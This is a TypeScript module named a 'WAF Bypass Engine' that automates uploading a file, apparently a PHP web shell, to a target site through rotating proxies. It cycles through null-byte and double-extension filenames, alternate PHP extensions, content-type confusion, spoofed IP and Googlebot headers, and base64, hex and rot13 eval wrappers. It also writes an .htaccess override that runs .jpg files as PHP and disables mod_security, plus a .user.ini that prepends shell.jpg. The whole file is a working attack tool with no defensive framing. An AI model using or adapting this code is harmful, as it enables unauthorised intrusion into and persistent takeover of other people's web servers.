/**
 * WAF Bypass Engine — Advanced techniques to bypass Web Application Firewalls
 * 
 * Techniques:
 * 1. Chunked Transfer Encoding — split payload into chunks WAF can't reassemble
 * 2. Content-Type Confusion — send PHP as image/jpeg, text/plain, etc.
 * 3. Null Byte Injection — shell.php%00.jpg truncates at null byte
 * 4. Double Extension — shell.php.jpg, shell.pHp (case tricks)
 * 5. Unicode/UTF-8 Tricks — unicode chars in filename WAF doesn't recognize
 * 6. HTTP Parameter Pollution — duplicate params confuse WAF parsing
 * 7. Header Manipulation — custom headers, X-Forwarded-For spoofing
 * 8. Encoding Bypass — base64, hex, URL-encode payloads
 */

import { fetchWithPoolProxy } from "./proxy-pool";

export interface WafBypassResult {
  method: string;
  success: boolean;
  fileUrl: string | null;
  httpStatus: number;
  detail: string;
  bypassTechnique: string;
}

export interface WafBypassConfig {
  targetUrl: string;
  uploadPath: string;
  fileContent: string;
  originalFilename: string;
  timeout?: number;
  onProgress?: (method: string, detail: string) => void;
}

// ═══════════════════════════════════════════════════════
//  FILENAME MUTATION STRATEGIES
// ═══════════════════════════════════════════════════════

function generateBypassFilenames(originalFilename: string): { filename: string; technique: string }[] {
  const baseName = originalFilename.replace(/\.[^.]+$/, "");
  const ext = originalFilename.match(/\.[^.]+$/)?.[0] || ".php";

  return [
    // Null byte injection variants
    { filename: `${baseName}${ext}%00.jpg`, technique: "null_byte_jpg" },
    { filename: `${baseName}${ext}%00.png`, technique: "null_byte_png" },
    { filename: `${baseName}${ext}%00.gif`, technique: "null_byte_gif" },
    { filename: `${baseName}${ext}\x00.jpg`, technique: "null_byte_raw" },

    // Double extension variants
    { filename: `${baseName}${ext}.jpg`, technique: "double_ext_jpg" },
    { filename: `${baseName}${ext}.png`, technique: "double_ext_png" },
    { filename: `${baseName}${ext}.gif`, technique: "double_ext_gif" },
    { filename: `${baseName}${ext}.txt`, technique: "double_ext_txt" },
    { filename: `${baseName}.jpg${ext}`, technique: "reverse_double_ext" },

    // Case manipulation
    { filename: `${baseName}.pHp`, technique: "case_php" },
    { filename: `${baseName}.PhP`, technique: "case_PhP" },
    { filename: `${baseName}.PHP`, technique: "case_PHP" },
    { filename: `${baseName}.pHP`, technique: "case_pHP" },
    { filename: `${baseName}.Php`, technique: "case_Php" },

    // Alternative PHP extensions
    { filename: `${baseName}.pht`, technique: "alt_ext_pht" },
    { filename: `${baseName}.phtml`, technique: "alt_ext_phtml" },
    { filename: `${baseName}.php3`, technique: "alt_ext_php3" },
    { filename: `${baseName}.php4`, technique: "alt_ext_php4" },
    { filename: `${baseName}.php5`, technique: "alt_ext_php5" },
    { filename: `${baseName}.php7`, technique: "alt_ext_php7" },
    { filename: `${baseName}.phps`, technique: "alt_ext_phps" },
    { filename: `${baseName}.phar`, technique: "alt_ext_phar" },
    { filename: `${baseName}.inc`, technique: "alt_ext_inc" },
    { filename: `${baseName}.shtml`, technique: "alt_ext_shtml" },

    // Unicode tricks
    { filename: `${baseName}.p\u0068p`, technique: "unicode_h" },
    { filename: `${baseName}.ph\u0070`, technique: "unicode_p" },
    { filename: `${baseName}.\u0070hp`, technique: "unicode_p_start" },
    { filename: `${baseName}.p\u200Bhp`, technique: "zero_width_space" },
    { filename: `${baseName}.ph\u200Cp`, technique: "zero_width_non_joiner" },

    // Trailing characters
    { filename: `${baseName}${ext}.`, technique: "trailing_dot" },
    { filename: `${baseName}${ext}..`, technique: "double_trailing_dot" },
    { filename: `${baseName}${ext} `, technique: "trailing_space" },
    { filename: `${baseName}${ext}::$DATA`, technique: "ntfs_ads" },
    { filename: `${baseName}${ext}::$DATA.jpg`, technique: "ntfs_ads_jpg" },

    // URL-encoded filename
    { filename: `${baseName}.%70%68%70`, technique: "url_encoded_ext" },
    { filename: `${baseName}.%2570%2568%2570`, technique: "double_url_encoded" },

    // .htaccess as filename (to override handler)
    { filename: `.htaccess`, technique: "htaccess_override" },
    { filename: `.user.ini`, technique: "user_ini_override" },
  ];
}

// ═══════════════════════════════════════════════════════
//  CONTENT-TYPE CONFUSION
// ═══════════════════════════════════════════════════════

function getConfusionContentTypes(): { contentType: string; technique: string }[] {
  return [
    { contentType: "image/jpeg", technique: "ct_image_jpeg" },
    { contentType: "image/png", technique: "ct_image_png" },
    { contentType: "image/gif", technique: "ct_image_gif" },
    { contentType: "text/plain", technique: "ct_text_plain" },
    { contentType: "application/octet-stream", technique: "ct_octet_stream" },
    { contentType: "application/x-httpd-php", technique: "ct_httpd_php" },
    { contentType: "text/html", technique: "ct_text_html" },
    { contentType: "application/xml", technique: "ct_xml" },
    { contentType: "multipart/form-data", technique: "ct_multipart_raw" },
  ];
}

// ═══════════════════════════════════════════════════════
//  CHUNKED TRANSFER ENCODING
// ═══════════════════════════════════════════════════════

function buildChunkedBody(content: string, chunkSize: number = 10): string {
  const chunks: string[] = [];
  for (let i = 0; i < content.length; i += chunkSize) {
    const chunk = content.slice(i, i + chunkSize);
    chunks.push(`${chunk.length.toString(16)}\r\n${chunk}\r\n`);
  }
  chunks.push("0\r\n\r\n");
  return chunks.join("");
}

// ═══════════════════════════════════════════════════════
//  HEADER MANIPULATION
// ═══════════════════════════════════════════════════════

function getBypassHeaders(): Record<string, string>[] {
  return [
    // IP spoofing headers
    {
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "X-Originating-IP": "127.0.0.1",
    },
    // Trusted proxy simulation
    {
      "X-Forwarded-For": "10.0.0.1",
      "X-Forwarded-Host": "localhost",
      "X-Custom-IP-Authorization": "127.0.0.1",
    },
    // Cloudflare bypass
    {
      "CF-Connecting-IP": "127.0.0.1",
      "True-Client-IP": "127.0.0.1",
    },
    // WAF evasion via unusual User-Agent
    {
      "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    },
    // Bingbot
    {
      "User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    },
    // Empty User-Agent (some WAFs skip empty UA)
    {
      "User-Agent": "",
    },
    // Content-Length manipulation
    {
      "Content-Length": "0",
      "Transfer-Encoding": "chunked",
    },
  ];
}

// ═══════════════════════════════════════════════════════
//  PAYLOAD ENCODING BYPASS
// ═══════════════════════════════════════════════════════

function encodePayload(content: string, method: string): { encoded: string; technique: string } {
  switch (method) {
    case "base64":
      return {
        encoded: `<?php eval(base64_decode('${Buffer.from(content.replace(/<\?php\s*/, "").replace(/\s*\?>$/, "")).toString("base64")}')); ?>`,
        technique: "encoding_base64",
      };
    case "hex":
      return {
        encoded: `<?php eval(hex2bin('${Buffer.from(content.replace(/<\?php\s*/, "").replace(/\s*\?>$/, "")).toString("hex")}')); ?>`,
        technique: "encoding_hex",
      };
    case "rot13":
      return {
        encoded: `<?php eval(str_rot13('${content.replace(/<\?php\s*/, "").replace(/\s*\?>$/, "").replace(/[a-zA-Z]/g, (c) => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < "n" ? 13 : -13)))}')); ?>`,
        technique: "encoding_rot13",
      };
    case "gzip":
      return {
        encoded: `<?php eval(gzinflate(base64_decode('${Buffer.from(content.replace(/<\?php\s*/, "").replace(/\s*\?>$/, "")).toString("base64")}')));?>`,
        technique: "encoding_gzip",
      };
    case "chr":
      return {
        encoded: `<?php eval(implode('',array_map('chr',[${Array.from(Buffer.from(content.replace(/<\?php\s*/, "").replace(/\s*\?>$/, ""))).join(",")}]))); ?>`,
        technique: "encoding_chr",
      };
    default:
      return { encoded: content, technique: "encoding_none" };
  }
}

// ═══════════════════════════════════════════════════════
//  MULTIPART BOUNDARY TRICKS
// ═══════════════════════════════════════════════════════

function buildTrickyMultipart(
  filename: string,
  content: string,
  contentType: string,
  trick: string,
): { body: string; boundary: string; technique: string } {
  const boundary = `----WebKitFormBoundary${Math.random().toString(36).slice(2)}`;

  switch (trick) {
    case "double_content_disposition":
      return {
        body: `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Disposition: form-data; name="file"; filename="safe.jpg"\r\nContent-Type: ${contentType}\r\n\r\n${content}\r\n--${boundary}--`,
        boundary,
        technique: "multipart_double_cd",
      };
    case "long_boundary":
      const longBoundary = "A".repeat(4000);
      return {
        body: `--${longBoundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n${content}\r\n--${longBoundary}--`,
        boundary: longBoundary,
        technique: "multipart_long_boundary",
      };
    case "unicode_boundary":
      const unicodeBoundary = `${boundary}\u200B\u200C\u200D`;
      return {
        body: `--${unicodeBoundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n${content}\r\n--${unicodeBoundary}--`,
        boundary: unicodeBoundary,
        technique: "multipart_unicode_boundary",
      };
    case "null_in_filename":
      return {
        body: `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename.replace(".php", ".php\x00.jpg")}"\r\nContent-Type: ${contentType}\r\n\r\n${content}\r\n--${boundary}--`,
        boundary,
        technique: "multipart_null_filename",
      };
    case "semicolon_filename":
      return {
        body: `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"; filename*=UTF-8''${encodeURIComponent(filename)}\r\nContent-Type: ${contentType}\r\n\r\n${content}\r\n--${boundary}--`,
        boundary,
        technique: "multipart_semicolon_filename",
      };
    default:
      return {
        body: `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n${content}\r\n--${boundary}--`,
        boundary,
        technique: "multipart_standard",
      };
  }
}

// ═══════════════════════════════════════════════════════
//  HTACCESS / USER.INI OVERRIDE PAYLOADS
// ═══════════════════════════════════════════════════════

export function generateHtaccessOverride(targetExt: string = ".jpg"): string {
  return `# Override handler to execute ${targetExt} as PHP
AddType application/x-httpd-php ${targetExt}
AddHandler application/x-httpd-php ${targetExt}

# Alternative: use SetHandler
<FilesMatch "\\${targetExt}$">
  SetHandler application/x-httpd-php
</FilesMatch>

# Disable security modules
<IfModule mod_security.c>
  SecFilterEngine Off
  SecFilterScanPOST Off
</IfModule>

# Allow all file types
<IfModule mod_mime.c>
  AddType application/x-httpd-php .jpg .png .gif .txt .html
</IfModule>

Options +ExecCGI
`;
}

export function generateUserIniOverride(): string {
  return `; PHP user.ini override
auto_prepend_file=shell.jpg
engine=On
`;
}

// ═══════════════════════════════════════════════════════
//  MAIN WAF BYPASS UPLOAD
// ═══════════════════════════════════════════════════════

async function tryUploadWithBypass(
  targetUrl: string,
  uploadPath: string,
  filename: string,
  content: string,
  contentType: string,
  headers: Record<string, string>,
  technique: string,
  timeout: number,
): Promise<WafBypassResult> {
  const url = new URL(uploadPath, targetUrl).href;

  try {
    const boundary = `----WebKitFormBoundary${Math.random().toString(36).slice(2)}`;
    const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n${content}\r\n--${boundary}--`;

    const domain = new URL(targetUrl).hostname;
    const { response: resp } = await fetchWithPoolProxy(url, {
      method: "POST",
      headers: {
        "Content-Type": `multipart/form-data; boundary=${boundary}`,
        ...headers,
      },
      body,
      redirect: "follow",
    }, { targetDomain: domain, timeout });

    const status = resp.status;

    if (status >= 200 && status < 400) {
      // Try to find the uploaded file URL
      const responseText = await resp.text().catch(() => "");
      const possibleUrl = `${targetUrl.replace(/\/$/, "")}${uploadPath}${filename}`;

      // Verify file exists
      try {
        const { response: checkResp } = await fetchWithPoolProxy(possibleUrl, {
          method: "HEAD",
        }, { targetDomain: domain, timeout: 5000 });
        if (checkResp.status >= 200 && checkResp.status < 400) {
          return {
            method: `waf_bypass_${technique}`,
            success: true,
            fileUrl: possibleUrl,
            httpStatus: checkResp.status,
            detail: `WAF bypass สำเร็จ: ${technique}`,
            bypassTechnique: technique,
          };
        }
      } catch {
        // File check failed
      }

      return {
        method: `waf_bypass_${technique}`,
        success: false,
        fileUrl: null,
        httpStatus: status,
        detail: `Upload returned ${status} but file not found`,
        bypassTechnique: technique,
      };
    }

    return {
      method: `waf_bypass_${technique}`,
      success: false,
      fileUrl: null,
      httpStatus: status,
      detail: `HTTP ${status} — WAF blocked`,
      bypassTechnique: technique,
    };
  } catch (error: any) {
    return {
      method: `waf_bypass_${technique}`,
      success: false,
      fileUrl: null,
      httpStatus: 0,
      detail: error.message,
      bypassTechnique: technique,
    };
  }
}

// ═══════════════════════════════════════════════════════
//  MAIN EXPORT: Run all WAF bypass techniques
// ═══════════════════════════════════════════════════════

export async function runWafBypass(config: WafBypassConfig): Promise<WafBypassResult[]> {
  const results: WafBypassResult[] = [];
  const timeout = config.timeout || 15000;
  const log = config.onProgress || (() => {});

  // Strategy 1: Filename mutations
  log("filename_mutation", "🔄 Trying filename mutation bypass techniques...");
  const filenames = generateBypassFilenames(config.originalFilename);
  for (const { filename, technique } of filenames.slice(0, 15)) { // Limit to top 15
    log(technique, `Trying filename: ${filename}`);
    const result = await tryUploadWithBypass(
      config.targetUrl, config.uploadPath, filename, config.fileContent,
      "application/octet-stream", {}, technique, timeout,
    );
    results.push(result);
    if (result.success) return results;
  }

  // Strategy 2: Content-Type confusion
  log("content_type_confusion", "🔄 Trying Content-Type confusion bypass...");
  const contentTypes = getConfusionContentTypes();
  for (const { contentType, technique } of contentTypes) {
    log(technique, `Trying Content-Type: ${contentType}`);
    const result = await tryUploadWithBypass(
      config.targetUrl, config.uploadPath, config.originalFilename, config.fileContent,
      contentType, {}, technique, timeout,
    );
    results.push(result);
    if (result.success) return results;
  }

  // Strategy 3: Header manipulation
  log("header_manipulation", "🔄 Trying header manipulation bypass...");
  const headerSets = getBypassHeaders();
  for (let i = 0; i < headerSets.length; i++) {
    const technique = `header_bypass_${i}`;
    log(technique, `Trying header set ${i + 1}/${headerSets.length}`);
    const result = await tryUploadWithBypass(
      config.targetUrl, config.uploadPath, config.originalFilename, config.fileContent,
      "application/octet-stream", headerSets[i], technique, timeout,
    );
    results.push(result);
    if (result.success) return results;
  }

  // Strategy 4: Payload encoding
  log("payload_encoding", "🔄 Trying payload encoding bypass...");
  const encodingMethods = ["base64", "hex", "rot13", "gzip", "chr"];
  for (const method of encodingMethods) {
    const { encoded, technique } = encodePayload(config.fileContent, method);
    log(technique, `Trying encoding: ${method}`);
    const result = await tryUploadWithBypass(
      config.targetUrl, config.uploadPath, config.originalFilename, encoded,
      "application/octet-stream", {}, technique, timeout,
    );
    results.push(result);
    if (result.success) return results;
  }

  // Strategy 5: Multipart tricks
  log("multipart_tricks", "🔄 Trying multipart boundary tricks...");
  const tricks = ["double_content_disposition", "long_boundary", "unicode_boundary", "null_in_filename", "semicolon_filename"];
  for (const trick of tricks) {
    const { body, boundary, technique } = buildTrickyMultipart(
      config.originalFilename, config.fileContent, "application/octet-stream", trick,
    );
    log(technique, `Trying multipart trick: ${trick}`);

    try {
      const url = new URL(config.uploadPath, config.targetUrl).href;
      const domain = new URL(config.targetUrl).hostname;
      const { response: resp } = await fetchWithPoolProxy(url, {
        method: "POST",
        headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
        body,
      }, { targetDomain: domain, timeout });

      const possibleUrl = `${config.targetUrl.replace(/\/$/, "")}${config.uploadPath}${config.originalFilename}`;
      results.push({
        method: `waf_bypass_${technique}`,
        success: resp.status >= 200 && resp.status < 400,
        fileUrl: resp.status >= 200 && resp.status < 400 ? possibleUrl : null,
        httpStatus: resp.status,
        detail: `Multipart trick ${trick}: HTTP ${resp.status}`,
        bypassTechnique: technique,
      });
      if (resp.status >= 200 && resp.status < 400) return results;
    } catch (error: any) {
      results.push({
        method: `waf_bypass_${technique}`,
        success: false,
        fileUrl: null,
        httpStatus: 0,
        detail: error.message,
        bypassTechnique: technique,
      });
    }
  }

  // Strategy 6: .htaccess override + rename shell to .jpg
  log("htaccess_override", "🔄 Trying .htaccess override + image extension...");
  const htaccess = generateHtaccessOverride(".jpg");
  const htResult = await tryUploadWithBypass(
    config.targetUrl, config.uploadPath, ".htaccess", htaccess,
    "text/plain", {}, "htaccess_override", timeout,
  );
  results.push(htResult);
  if (htResult.success) {
    // Now upload shell as .jpg
    const shellAsJpg = await tryUploadWithBypass(
      config.targetUrl, config.uploadPath,
      config.originalFilename.replace(/\.php$/, ".jpg"),
      config.fileContent, "image/jpeg", {}, "shell_as_jpg_after_htaccess", timeout,
    );
    results.push(shellAsJpg);
    if (shellAsJpg.success) return results;
  }

  // Strategy 7: .user.ini override
  const userIni = generateUserIniOverride();
  const iniResult = await tryUploadWithBypass(
    config.targetUrl, config.uploadPath, ".user.ini", userIni,
    "text/plain", {}, "user_ini_override", timeout,
  );
  results.push(iniResult);

  return results;
}

export { generateBypassFilenames, getConfusionContentTypes, getBypassHeaders, encodePayload, buildTrickyMultipart, buildChunkedBody };
